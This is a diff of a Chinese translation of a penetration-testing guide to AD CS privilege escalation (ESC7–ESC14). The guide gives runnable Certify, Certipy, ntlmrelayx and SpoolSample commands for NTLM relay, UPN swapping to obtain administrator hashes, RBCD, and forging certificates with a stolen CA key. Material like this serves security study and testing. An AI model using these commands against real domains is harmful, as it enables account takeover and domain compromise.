+最后，我们可以使用 `req` 命令和 `-retrieve <request ID>` 参数来**获取已颁发的证书**。
 ```bash
 certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
@@ -335,81 +335,83 @@ Certipy v4.0.0 - by Oliver Lyak (ly4k)
 [*] Loaded private key from '785.key'
 [*] Saved certificate and private key to 'administrator.pfx'
 ```
-### 攻击 3 – Manage Certificates Extension Abuse (SetExtension)
+### Attack 3 – Manage Certificates Extension Abuse (SetExtension)
 
-#### 解释
+#### 说明
 
-除了经典的 ESC7 滥用（启用 EDITF 属性或批准挂起请求）之外，**Certify 2.0** 揭示了一个全新的原语，只需要 Enterprise CA 上的 *Manage Certificates*（亦称 **Certificate Manager / Officer**）角色。
+除了经典的 ESC7 abuse（启用 EDITF attributes 或批准 pending requests）之外，**Certify 2.0** 还揭示了一种全新的 primitive，它只需要 Enterprise CA 上的 *Manage Certificates*（又称 **Certificate Manager / Officer**）role。
 
-`ICertAdmin::SetExtension` RPC 方法可以由任何持有 *Manage Certificates* 的主体执行。虽然该方法传统上由合法的 CA 用于更新**挂起**请求上的扩展，但攻击者可以滥用它，将一个**非默认**证书扩展（例如自定义的 *Certificate Issuance Policy* OID，比如 `1.1.1.1`）追加到等待批准的请求上。
+任何持有 *Manage Certificates* 的 principal 都可以执行 `ICertAdmin::SetExtension` RPC method。该 method 传统上由合法 CA 用于更新 **pending** requests 上的 extensions，但 attacker 可以滥用它，将一个 *non-default* certificate extension（例如自定义的 *Certificate Issuance Policy* OID，如 `1.1.1.1`）追加到等待批准的 request 中。
 
-由于目标模板**没有为该扩展定义默认值**，当请求最终颁发时，CA 不会覆盖攻击者控制的值。因此生成的证书包含攻击者选择的扩展，该扩展可能：
+由于目标 template 没有为该 extension 定义 default value，因此 request 最终签发时，CA **不会**覆盖 attacker-controlled value。由此生成的 certificate 会包含 attacker 选择的 extension，该 extension 可能：
 
-* 满足其他易受影响模板的 Application / Issuance Policy 要求（导致权限提升）。
-* 注入额外的 EKUs 或策略，使证书在第三方系统中获得意外的信任。
+* 满足其他 vulnerable templates 的 Application / Issuance Policy requirements（从而导致 privilege escalation）。
+* 注入额外的 EKUs 或 policies，使 certificate 在 third-party systems 中获得意外的 trust。
 
-简而言之，*Manage Certificates* —— 之前被认为是 ESC7 中“较弱”的一半 —— 现在可以在不修改 CA 配置或不需要更严格的 *Manage CA* 权限的情况下，被用于完整的权限提升或长期持久化。
+简而言之，*Manage Certificates* ——过去被认为是 ESC7 中“权限较低”的一半——现在可以被用于实现完整的 privilege escalation 或长期 persistence，而无需修改 CA configuration，也不需要权限限制更严格的 *Manage CA* right。
 
-#### 使用 Certify 2.0 滥用该原语
+#### 使用 Certify 2.0 abuse 此 primitive
 
-1. **提交一个会保持为 *pending* 的证书请求。** 可以通过需要管理员批准的模板强制实现：
+1. **提交一个会保持为 *pending* 的 certificate request。** 可以使用要求 manager approval 的 template 强制实现：
 ```powershell
 Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
 # Take note of the returned Request ID
 ```
 
-2. 使用新的 `manage-ca` 命令**将自定义扩展追加到挂起的请求**：
+2. **使用新的 `manage-ca` command** 向 pending request 追加 custom extension：
 ```powershell
 Certify.exe manage-ca --ca SERVER\\CA-NAME \
 --request-id 1337 \
 --set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
 ```
-*如果模板尚未定义 *Certificate Issuance Policies* 扩展，上述值在颁发后将被保留。*
+*如果 template 尚未定义 *Certificate Issuance Policies* extension，则上述 value 会在签发后保留。*
 
-3. **颁发该请求**（如果你的角色也有 *Manage Certificates* 的批准权限）或等待操作员批准。一旦颁发，下载证书：
+3. **签发 request**（如果你的 role 同时拥有 *Manage Certificates* approval rights），或者等待 operator 批准。签发后，下载 certificate：
 ```powershell
 Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
 ```
 
-4. 生成的证书现在包含恶意的 issuance-policy OID，并可用于后续攻击（例如 ESC13、域权限提升等）。
+4. 生成的 certificate 现在包含恶意的 issuance-policy OID，可用于后续 attacks（例如 ESC13、domain escalation 等）。
 
-> 注意：相同的攻击也可以通过 Certipy ≥ 4.7 使用 `ca` 命令和 `-set-extension` 参数执行。
+> NOTE: 通过 `ca` command 和 `-set-extension` parameter，也可以使用 Certipy ≥ 4.7 执行相同的 attack。
 
-## NTLM Relay 到 AD CS HTTP 端点 – ESC8
+## NTLM Relay to AD CS HTTP Endpoints – ESC8
 
-### 解释
+### 说明
 
 > [!TIP]
-> 在已安装 **AD CS** 的环境中，如果存在一个**易受攻击的 web enrollment endpoint**，并且至少发布了一个允许**域计算机注册和客户端认证**（例如默认的 **`Machine`** 模板）的**certificate template**，那么**任何启用 spooler 服务的计算机都可能被攻击者攻破**！
+> 在安装了 **AD CS** 的 environments 中，如果存在一个 **web enrollment endpoint vulnerable**，并且至少发布了一个允许 **domain computer enrollment and client authentication** 的 **certificate template**（例如默认的 **`Machine`** template），则 **任何 spooler service active 的 computer 都可能被 attacker compromise**！
 
-AD CS 支持若干 **HTTP-based enrollment methods**，通过管理员可能安装的额外服务器角色提供。这些基于 HTTP 的证书注册接口容易受到 **NTLM relay attacks**。攻击者可以从 **被攻陷的机器** 模拟任何通过入站 NTLM 进行身份验证的 AD 帐户。在模拟受害者帐户期间，攻击者可以访问这些 web 接口，使用 `User` 或 `Machine` certificate templates **请求客户端认证证书**。
+AD CS 支持多种 **HTTP-based enrollment methods**，这些 methods 通过 administrators 可能安装的额外 server roles 提供。这些用于 HTTP-based certificate enrollment 的 interfaces 容易受到 **NTLM relay attacks** 的影响。attacker 可以从一台 **compromised machine** 发起攻击，impersonate 任何通过 inbound NTLM 进行 authentication 的 AD account。在 impersonate victim account 的同时，attacker 可以访问这些 web interfaces，使用 `User` 或 `Machine` certificate templates **request 一个 client authentication certificate**。
 
-- **web enrollment interface**（较旧的 ASP 应用，可在 `http://<caserver>/certsrv/` 访问）默认仅使用 HTTP，这不会防御 NTLM relay attacks。此外，它通过其 Authorization HTTP header 明确只允许 NTLM 验证，使得更安全的验证方法（如 Kerberos）无法使用。
-- **Certificate Enrollment Service** (CES)、**Certificate Enrollment Policy** (CEP) Web Service 和 **Network Device Enrollment Service** (NDES) 默认通过其 Authorization HTTP header 支持 negotiate 验证。negotiate 验证**同时支持** Kerberos 和 **NTLM**，允许攻击者在中继攻击中**降级到 NTLM** 验证。尽管这些 web 服务默认启用 HTTPS，但单独的 HTTPS **无法防止 NTLM relay attacks**。只有当 HTTPS 与 channel binding 结合时，HTTPS 服务才能免受 NTLM relay attacks 的影响。不幸的是，AD CS 并未在 IIS 上启用 Extended Protection for Authentication，这对于 channel binding 是必需的。
+- **web enrollment interface**（较旧的 ASP application，可通过 `http://<caserver>/certsrv/` 访问）默认仅使用 HTTP，不提供针对 NTLM relay attacks 的 protection。此外，它通过 Authorization HTTP header 明确只允许 NTLM authentication，使 Kerberos 等更安全的 authentication methods 无法适用。
+- **Certificate Enrollment Service**（CES）、**Certificate Enrollment Policy**（CEP）Web Service 和 **Network Device Enrollment Service**（NDES）默认支持通过其 Authorization HTTP header 使用 negotiate authentication。Negotiate authentication **同时支持** Kerberos 和 **NTLM**，因此 attacker 可以在 relay attacks 期间将 authentication **downgrade 为 NTLM**。虽然这些 web services 默认启用 HTTPS，但单独使用 HTTPS **无法防御 NTLM relay attacks**。只有将 HTTPS 与 channel binding 结合使用，才能为 HTTPS services 提供针对 NTLM relay attacks 的 protection。遗憾的是，AD CS 不会在 IIS 上启用 Extended Protection for Authentication，而 channel binding 需要该功能。
 
-NTLM relay attacks 的一个常见问题是 NTLM 会话的**持续时间短**，以及攻击者无法与**要求 NTLM signing**的服务进行交互。
+NTLM relay attacks 的一个常见 **issue** 是 NTLM sessions 的 **short duration**，以及 attacker 无法与要求 NTLM signing 的 services 交互。
 
-然而，这一限制可以通过利用 NTLM relay 攻击为用户获取一个证书来克服，因为证书的有效期决定了会话的持续时间，且该证书可用于需要 **NTLM signing** 的服务。有关如何使用被窃取证书的说明，请参见：
+不过，通过利用 NTLM relay attack 为 user 获取 certificate，可以克服这一限制，因为 certificate 的 validity period 决定 session 的 duration，并且该 certificate 可以用于 **mandate NTLM signing** 的 services。有关如何使用 stolen certificate 的说明，请参阅：
+
 
 {{#ref}}
 account-persistence.md
 {{#endref}}
 
-NTLM relay attacks 的另一个限制是 **攻击者控制的机器必须被受害者帐户认证**。攻击者可以选择等待或尝试**强制**该认证：
+NTLM relay attacks 的另一个 limitation 是，**victim account 必须对 attacker-controlled machine 进行 authentication**。attacker 可以等待，或者尝试 **force** 该 authentication：
+
 
 {{#ref}}
 ../printers-spooler-service-abuse.md
 {{#endref}}
 
-### **滥用**
+### **Abuse**
 
-[**Certify**](https://github.com/GhostPack/Certify)’s `cas` 枚举 **enabled HTTP AD CS endpoints**:
+[**Certify**](https://github.com/GhostPack/Certify) 的 `cas` 会枚举 **enabled HTTP AD CS endpoints**：
 ```
 Certify.exe cas
 ```
 <figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>
 
-`msPKI-Enrollment-Servers` 属性被企业证书颁发机构 (CAs) 用于存储证书注册服务 (CES) 端点。可以使用工具 **Certutil.exe** 解析并列出这些端点：
+`msPKI-Enrollment-Servers` 属性由企业 Certificate Authorities（CAs）用于存储 Certificate Enrollment Service（CES）端点。可以使用工具 **Certutil.exe** 解析并列出这些端点：
 ```
 certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
 ```
@@ -435,11 +437,11 @@ proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2sup
 # Force authentication from victim to compromised machine with port forwards
 execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
 ```
-#### Abuse with [Certipy](https://github.com/ly4k/Certipy)
+#### 使用 [Certipy](https://github.com/ly4k/Certipy) 进行滥用
 
-默认情况下，Certipy 会基于模板 `Machine` 或 `User` 发起证书请求，具体取决于被中继的账户名是否以 `$` 结尾。可以通过使用 `-template` 参数来指定替代模板。
+Certipy 默认根据模板 `Machine` 或 `User` 请求证书，具体取决于被 relay 的账户名称是否以 `$` 结尾。可以通过使用 `-template` 参数指定其他模板。
 
-随后可以使用像 [PetitPotam](https://github.com/ly4k/PetitPotam) 这样的技术来强制进行身份验证。针对域控制器，需要指定 `-template DomainController`。
+随后可以使用类似 [PetitPotam](https://github.com/ly4k/PetitPotam) 的技术强制进行身份验证。处理域控制器时，必须指定 `-template DomainController`。
 ```bash
 certipy relay -ca ca.corp.local
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
@@ -454,125 +456,125 @@ Certipy v4.0.0 - by Oliver Lyak (ly4k)
 ```
 ## 无安全扩展 - ESC9 <a href="#id-5485" id="id-5485"></a>
 
-### 解释
+### 说明
 
-新的值 **`CT_FLAG_NO_SECURITY_EXTENSION`**（`0x80000`）用于 **`msPKI-Enrollment-Flag`**，称为 ESC9，阻止在证书中嵌入新的 `szOID_NTDS_CA_SECURITY_EXT` 安全扩展。当 `StrongCertificateBindingEnforcement` 设置为 `1`（默认）时，该标志变得相关，这与设置为 `2` 相反。在可能被利用的较弱证书映射用于 Kerberos 或 Schannel 的情形（如 ESC10）中，其重要性更高，因为缺少 ESC9 并不会改变这些要求。
+**`CT_FLAG_NO_SECURITY_EXTENSION`**（`0x80000`）是 **`msPKI-Enrollment-Flag`** 的新值，也称为 ESC9，用于阻止在证书中嵌入新的 **`szOID_NTDS_CA_SECURITY_EXT` security extension**。当 **`StrongCertificateBindingEnforcement`** 设置为 `1`（默认设置）时，此标志会变得相关，而设置为 `2` 时则不同。在 Kerberos 或 Schannel 中可能利用较弱的 certificate mapping 的场景下（如 ESC10），该标志的重要性会进一步提高，因为没有 ESC9 并不会改变相关要求。
 
-此标志设置变得重要的条件包括：
+以下条件会使此标志的设置变得重要：
 
-- `StrongCertificateBindingEnforcement` 未设置为 `2`（默认是 `1`），或 `CertificateMappingMethods` 包含 `UPN` 标志。
-- 证书在 `msPKI-Enrollment-Flag` 设置中被标记了 `CT_FLAG_NO_SECURITY_EXTENSION` 标志。
+- `StrongCertificateBindingEnforcement` 未调整为 `2`（默认为 `1`），或 `CertificateMappingMethods` 包含 `UPN` 标志。
+- 证书在 `msPKI-Enrollment-Flag` 设置中标记了 `CT_FLAG_NO_SECURITY_EXTENSION` 标志。
 - 证书指定了任意 client authentication EKU。
-- `GenericWrite` 权限可用于对任意账户执行写入来危及另一个账户。
+- 对任意账户拥有 `GenericWrite` 权限，从而可以 compromise 另一个账户。
 
-### 滥用场景
+### Abuse 场景
 
-假设 `John@corp.local` 对 `Jane@corp.local` 拥有 `GenericWrite` 权限，目标是入侵 `Administrator@corp.local`。`Jane@corp.local` 被允许登记的 `ESC9` 证书模板，在其 `msPKI-Enrollment-Flag` 设置中配置了 `CT_FLAG_NO_SECURITY_EXTENSION` 标志。
+假设 `John@corp.local` 对 `Jane@corp.local` 拥有 `GenericWrite` 权限，目标是 compromise `Administrator@corp.local`。`Jane@corp.local` 有权限 enroll 的 `ESC9` certificate template，在其 `msPKI-Enrollment-Flag` 设置中配置了 `CT_FLAG_NO_SECURITY_EXTENSION` 标志。
 
-最初，借助 `John` 的 `GenericWrite`，使用 Shadow Credentials 获取了 `Jane` 的 hash：
+首先，利用 `John` 的 `GenericWrite`，通过 Shadow Credentials 获取 `Jane` 的 hash：
 ```bash
 certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
 ```
-随后，`Jane` 的 `userPrincipalName` 被修改为 `Administrator`，故意省略 `@corp.local` 域部分：
+随后，`Jane` 的 `userPrincipalName` 被修改为 `Administrator`，特意省略了 `@corp.local` 域部分：
 ```bash
 certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
 ```
-鉴于 `Administrator@corp.local` 仍然作为 `Administrator` 的 `userPrincipalName` 保持不变，此修改不违反约束。
+鉴于 `Administrator@corp.local` 仍作为 `Administrator` 的 `userPrincipalName` 保持独立，此修改不违反约束。
 
-随后，标记为易受攻击的证书模板 `ESC9` 被以 `Jane` 的身份请求：
+随后，以 `Jane` 的身份请求标记为存在漏洞的 `ESC9` certificate template：
 ```bash
 certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
 ```
-注意到证书的 `userPrincipalName` 显示为 `Administrator`，没有任何 “object SID”。
+据记录，该证书的 `userPrincipalName` 显示为 `Administrator`，不包含任何“object SID”。
 
-`Jane` 的 `userPrincipalName` 随后被恢复为她原来的 `Jane@corp.local`：
+随后，`Jane` 的 `userPrincipalName` 被恢复为其原始值 `Jane@corp.local`：
 ```bash
 certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
 ```
-使用已签发的证书尝试进行身份验证现在会返回 `Administrator@corp.local` 的 NT hash。由于证书未指定域，命令必须包含 `-domain <domain>`：
+现在尝试使用已签发的证书进行身份验证，即可获得 `Administrator@corp.local` 的 NT hash。由于证书中未指定域，命令必须包含 `-domain <domain>`：
 ```bash
 certipy auth -pfx adminitrator.pfx -domain corp.local
 ```
-## 弱证书映射 - ESC10
+## Weak Certificate Mappings - ESC10
 
-### 说明
+### Explanation
 
 ESC10 涉及域控制器上的两个注册表键值：
 
-- 在 `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` 下，`CertificateMappingMethods` 的默认值为 `0x18` (`0x8 | 0x10`)，先前为 `0x1F`。
-- 在 `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` 下，`StrongCertificateBindingEnforcement` 的默认设置为 `1`，先前为 `0`。
+- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` 下 `CertificateMappingMethods` 的默认值为 `0x18`（`0x8 | 0x10`），此前设置为 `0x1F`。
+- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` 下 `StrongCertificateBindingEnforcement` 的默认设置为 `1`，此前为 `0`。
 
-**情形 1**
+**Case 1**
 
 当 `StrongCertificateBindingEnforcement` 配置为 `0` 时。
 
-**情形 2**
+**Case 2**
 
-如果 `CertificateMappingMethods` 包含 `UPN` 位 (`0x4`)。
+如果 `CertificateMappingMethods` 包含 `UPN` 位（`0x4`）。
 
-### 滥用情形 1
+### Abuse Case 1
 
-当 `StrongCertificateBindingEnforcement` 配置为 `0` 时，具有 `GenericWrite` 权限的账户 A 可以被利用来攻破任意账户 B。
+当 `StrongCertificateBindingEnforcement` 配置为 `0` 时，拥有 `GenericWrite` 权限的账户 A 可被利用来攻陷任意账户 B。
 
-例如，攻击者对 `Jane@corp.local` 拥有 `GenericWrite` 权限，目标是攻破 `Administrator@corp.local`。该过程与 ESC9 类似，允许使用任意证书模板。
+例如，攻击者对 `Jane@corp.local` 拥有 `GenericWrite` 权限，并希望攻陷 `Administrator@corp.local`。该过程与 ESC9 类似，因此可以使用任意 certificate template。
 
-首先，利用 `GenericWrite`，通过 Shadow Credentials 获取 `Jane` 的哈希。
+首先，利用 `GenericWrite` 通过 Shadow Credentials 获取 `Jane` 的 hash。
 ```bash
 certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
 ```
-随后，将 `Jane` 的 `userPrincipalName` 更改为 `Administrator`，故意省略 `@corp.local` 部分以避免违反约束。
+随后，将 `Jane` 的 `userPrincipalName` 修改为 `Administrator`，故意省略 `@corp.local` 部分，以避免违反约束。
 ```bash
 certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
 ```
-随后，以 `Jane` 的身份使用默认的 `User` 模板请求了一个启用客户端身份验证的证书。
+随后，以 `Jane` 的身份使用默认的 `User` 模板请求一个启用客户端身份验证的证书。
 ```bash
 certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
 ```
-`Jane` 的 `userPrincipalName` 随后被还原为其原始值 `Jane@corp.local`。
+`Jane` 的 `userPrincipalName` 随后恢复为其原始值 `Jane@corp.local`。
 ```bash
 certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
 ```
-使用获取到的证书进行认证将会得到 `Administrator@corp.local` 的 NT hash，由于证书中没有域信息，因此在命令中需要指定域。
+使用获取的证书进行身份验证将获得 `Administrator@corp.local` 的 NT hash。由于证书中不包含域信息，因此必须在命令中指定域。
 ```bash
 certipy auth -pfx administrator.pfx -domain corp.local
 ```
-### 滥用案例 2
+### 滥用场景 2
 
-如果 `CertificateMappingMethods` 包含 `UPN` 位标志（`0x4`），则具有 `GenericWrite` 权限的帐户 A 可以妥协任何缺少 `userPrincipalName` 属性的帐户 B，包括机器帐户和内置域管理员 `Administrator`。
+当 `CertificateMappingMethods` 包含 `UPN` 位标志（`0x4`）时，拥有 `GenericWrite` 权限的账户 A 可以 compromise 任何缺少 `userPrincipalName` 属性的账户 B，包括机器账户和内置域管理员 `Administrator`。
 
-在这里，目标是妥协 `DC$@corp.local`，首先通过 Shadow Credentials 获取 `Jane` 的哈希，利用 `GenericWrite`。
+这里的目标是 compromise `DC$@corp.local`：首先通过 Shadow Credentials 获取 `Jane` 的 hash，然后利用 `GenericWrite`。
 ```bash
 certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
 ```
-然后将 `Jane` 的 `userPrincipalName` 设置为 `DC$@corp.local`。
+`Jane` 的 `userPrincipalName` 随后被设置为 `DC$@corp.local`。
 ```bash
 certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
 ```
-以 `Jane` 的身份，使用默认的 `User` 模板请求了一个用于客户端身份验证的证书。
+使用默认的 `User` 模板，以 `Jane` 身份请求客户端身份验证证书。
 ```bash
 certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
 ```
-在此过程之后，`Jane` 的 `userPrincipalName` 会恢复为原始值。
+`Jane` 的 `userPrincipalName` 会在此过程后恢复为其原始值。
 ```bash
 certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
 ```
-要通过 Schannel 进行身份验证，使用 Certipy 的 `-ldap-shell` 选项，显示身份验证成功为 `u:CORP\DC$`。
+通过 Schannel 进行身份验证时，会使用 Certipy 的 `-ldap-shell` 选项，显示身份验证成功，身份为 `u:CORP\DC$`。
 ```bash
 certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
 ```
-通过 LDAP shell，像 `set_rbcd` 这样的命令可用于发起 Resource-Based Constrained Delegation (RBCD) 攻击，可能导致 domain controller 被妥协。
+通过 LDAP shell，`set_rbcd` 等命令可启用基于资源的约束委派（RBCD）攻击，从而可能攻陷域控制器。
 ```bash
 certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
 ```
-这个漏洞同样影响任何缺少 `userPrincipalName` 或其与 `sAMAccountName` 不匹配的用户账户，默认的 `Administrator@corp.local` 是主要目标之一，因为它具有较高的 LDAP 权限，并且默认缺少 `userPrincipalName`。
+此漏洞还会影响任何缺少 `userPrincipalName` 的用户账户，或其 `userPrincipalName` 与 `sAMAccountName` 不匹配的用户账户。默认的 `Administrator@corp.local` 是主要目标，因为它具有较高的 LDAP 权限，并且默认情况下不存在 `userPrincipalName`。
 
-## 将 NTLM 中继到 ICPR - ESC11
+## Relaying NTLM to ICPR - ESC11
 
 ### 说明
 
-如果 CA Server 未配置 `IF_ENFORCEENCRYPTICERTREQUEST`，则可以通过 RPC 服务在不进行签名的情况下发动 NTLM 中继攻击。 [参考](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).
+如果 CA Server 未配置 `IF_ENFORCEENCRYPTICERTREQUEST`，则可以通过 RPC 服务，在不进行签名的情况下执行 NTLM relay attacks。[参考资料](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)。
 
-你可以使用 `certipy` 来枚举 `Enforce Encryption for Requests` 是否被禁用，certipy 会显示 `ESC11` 漏洞。
+你可以使用 `certipy` 枚举 `Enforce Encryption for Requests` 是否已禁用；如果已禁用，certipy 将显示 `ESC11` Vulnerabilities。
 ```bash
 $ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
@@ -591,7 +593,7 @@ ESC11                             : Encryption is not enforced for ICPR requests
 ```
 ### 滥用场景
 
-需要搭建一个中继服务器：
+需要设置一个中继服务器：
 ```bash
 $ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
 Certipy v4.7.0 - by Oliver Lyak (ly4k)
@@ -610,29 +612,29 @@ Certipy v4.7.0 - by Oliver Lyak (ly4k)
 [*] Saved certificate and private key to 'administrator.pfx'
 [*] Exiting...
 ```
-注意：对于域控制器，我们必须在 DomainController 中指定 `-template`。
+注意：对于域控制器，必须在 DomainController 中指定 `-template`。
 
-或者使用 [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
+或者使用 [sploutchy's fork of impacket](https://github.com/sploutchy/impacket)：
 ```bash
 $ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
 ```
-## 使用 YubiHSM 获取对 ADCS CA 的 shell 访问 - ESC12
+## Shell access to ADCS CA with YubiHSM - ESC12
 
 ### 说明
 
-管理员可以将证书颁发机构（Certificate Authority，CA）配置为将其私钥存放在外部设备上，例如 "Yubico YubiHSM2"。
+管理员可以将 Certificate Authority 配置为将其存储在外部设备上，例如 "Yubico YubiHSM2"。
 
-如果 USB 设备通过 USB 端口连接到 CA 服务器，或在 CA 服务器为虚拟机时通过 USB device server 连接，Key Storage Provider 在生成并使用 YubiHSM 中的密钥时需要一个认证密钥（有时称为 "password"）。
+如果 USB 设备通过 USB 端口连接到 CA server，或者在 CA server 为 virtual machine 的情况下连接到 USB device server，则需要 authentication key（有时称为 "password"），供 Key Storage Provider 在 YubiHSM 中生成和使用 keys。
 
-该密钥/密码以明文形式存储在注册表的 `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` 下。
+此 key/password 以明文形式存储在注册表的 `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` 中。
 
-Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).
+参考[此处](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)。
 
-### 滥用场景
+### Abuse Scenario
 
-如果 CA 的私钥存储在物理 USB 设备上，而你获得了对服务器的 shell 访问，则有可能恢复该私钥。
+如果 CA 的 private key 存储在 physical USB device 中，并且你获得了 shell access，则可以恢复该 key。
 
-首先，你需要获取 CA 证书（这是公开的），然后：
+首先，需要获取 CA certificate（这是 public 的），然后：
 ```cmd
 # import it to the user store with CA certificate
 $ certutil -addstore -user my <CA certificate file>
@@ -640,17 +642,17 @@ $ certutil -addstore -user my <CA certificate file>
 # Associated with the private key in the YubiHSM2 device
 $ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
 ```
-最后，使用 certutil `-sign` 命令，使用 CA 证书及其私钥伪造一个任意的新证书。
+最后，使用 certutil `-sign` 命令，利用 CA 证书及其私钥伪造一个新的任意证书。
 
 ## OID Group Link Abuse - ESC13
 
-### 解释
+### 说明
 
-`msPKI-Certificate-Policy` 属性允许将颁发策略添加到证书模板中。负责颁发策略的 `msPKI-Enterprise-Oid` 对象可以在 PKI OID 容器的 Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) 中被发现。可以使用该对象的 `msDS-OIDToGroupLink` 属性将策略链接到 AD 组，从而使系统在用户出示该证书时将其授权为该组的成员。 [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).
+`msPKI-Certificate-Policy` 属性允许将 issuance policy 添加到 certificate template 中。负责发布 policies 的 `msPKI-Enterprise-Oid` objects 可以在 PKI OID container 的 Configuration Naming Context（CN=OID,CN=Public Key Services,CN=Services）中发现。通过该 object 的 `msDS-OIDToGroupLink` 属性，可以将 policy link 到 AD group，使 system 能够将出示该 certificate 的 user 授权为该 group 的 member。[相关参考](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53)。
 
-换句话说，当用户有权限注册/申请证书且该证书链接到一个 OID group 时，该用户可以继承该组的权限。
+换句话说，当 user 拥有 enroll certificate 的 permission，且该 certificate link 到 OID group 时，user 可以继承该 group 的 privileges。
 
-使用 [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) 查找 OIDToGroupLink:
+使用 [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) 查找 OIDToGroupLink：
 ```bash
 Enumerating OIDs
 ------------------------
@@ -674,47 +676,46 @@ OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
 ```
 ### 滥用场景
 
-查找一个用户权限，可以使用 `certipy find` 或 `Certify.exe find /showAllPermissions`。
+查找用户权限，可以使用 `certipy find` 或 `Certify.exe find /showAllPermissions`。
 
-如果 `John` 有权限注册 `VulnerableTemplate`，该用户可以继承 `VulnerableGroup` 组的权限。
+如果 `John` 具有对 `VulnerableTemplate` 的 enroll 权限，则该用户可以继承 `VulnerableGroup` 组的权限。
 
-所需做的只是指定该模板，它就会获得一个具有 OIDToGroupLink 权限的证书。
+它只需要指定该模板，即可获取一个具有 OIDToGroupLink 权限的证书。
 ```bash
 certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
 ```
-## 易受攻击的证书续期配置 - ESC14
+## Vulnerable Certificate Renewal Configuration- ESC14
 
 ### 说明
 
-在 https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping 的描述非常详尽。以下为原文引用。
+https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping 中的说明非常详尽。以下是原文引用。
 
-ESC14 处理源自“弱显式证书映射”的漏洞，主要通过对 Active Directory (AD) 用户或计算机帐户上的 `altSecurityIdentities` 属性的误用或不安全配置产生。这个多值属性允许管理员手动将 X.509 证书与 AD 帐户关联以用于身份验证。填充了显式映射后，这些映射可以覆盖默认的证书映射逻辑，默认逻辑通常依赖于证书 SAN 中的 UPN 或 DNS 名称，或嵌入在 `szOID_NTDS_CA_SECURITY_EXT` 安全扩展中的 SID。
+ESC14 针对的是由“weak explicit certificate mapping”引发的漏洞，主要涉及 Active Directory 用户或计算机账户上的 `altSecurityIdentities` 属性被滥用或配置不安全。此多值属性允许管理员手动将 X.509 certificates 与 AD 账户关联，以用于 authentication。当该属性被填充时，这些 explicit mappings 可以覆盖默认的 certificate mapping 逻辑。默认逻辑通常依赖 certificate 的 SAN 中的 UPN 或 DNS names，或 `szOID_NTDS_CA_SECURITY_EXT` security extension 中嵌入的 SID。
 
-“弱”映射发生在 `altSecurityIdentities` 属性中用于标识证书的字符串值过于宽泛、容易猜测、依赖非唯一的证书字段，或使用易被伪造的证书组件时。如果攻击者能获得或伪造一个其属性匹配该特权帐户的弱定义显式映射的证书，就可以使用该证书进行身份验证并冒充该帐户。
+当 `altSecurityIdentities` 属性中用于标识 certificate 的字符串过于宽泛、容易猜测、依赖非唯一的 certificate fields，或使用容易被 spoof 的 certificate components 时，就会形成“weak” mapping。如果 attacker 能够获取或构造一个 certificate，使其 attributes 匹配 privileged account 的此类 weak explicit mapping，那么就可以使用该 certificate 以该账户身份进行 authentication 和 impersonate。
 
